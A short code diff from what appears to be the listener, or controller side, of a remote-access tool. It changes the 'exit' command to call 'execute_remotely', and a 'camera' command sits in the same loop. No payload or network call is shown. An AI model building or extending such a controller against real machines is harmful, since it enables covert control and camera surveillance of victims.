@@ -170,8 +170,7 @@ class Listener:
 
 			elif command == "exit":
 				self.exit()
-				self.reliable_send("exit")
-				exit()
+				self.execute_remotely("exit")
 				break
 
 			elif command == "camera":
